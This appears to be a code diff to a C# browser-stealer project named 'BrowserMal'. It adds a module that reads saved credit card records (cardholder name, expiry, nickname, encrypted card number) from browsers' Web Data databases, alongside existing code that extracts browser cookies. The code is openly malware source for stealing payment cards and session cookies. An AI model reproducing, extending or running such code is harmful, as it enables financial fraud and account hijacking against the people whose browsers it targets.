@@ -3,6 +3,7 @@ using BrowserMal.Credential;
 using BrowserMal.Cookie;
 using System.Collections.Generic;
 using BrowserMal.Manager;
+using BrowserMal.Model;
 
 namespace BrowserMal
 {
@@ -20,6 +21,11 @@ namespace BrowserMal
 
             GenericManager<CookieModel> cookiesManager = new GenericManager<CookieModel>("cookies", new string[] { "host_key", "name", "path", "encrypted_value" });
             cookiesManager.Init(ref browsers, Browser.Util.COOKIES);
+
+            GenericManager<CreditCardModel> creditManager = new GenericManager<CreditCardModel>("credit_cards", 
+                new string[] { "name_on_card", "expiration_month", "expiration_year", "nickname", "card_number_encrypted" });
+
+            creditManager.Init(ref browsers, Browser.Util.WEB_DATA);
         }
     }
 }
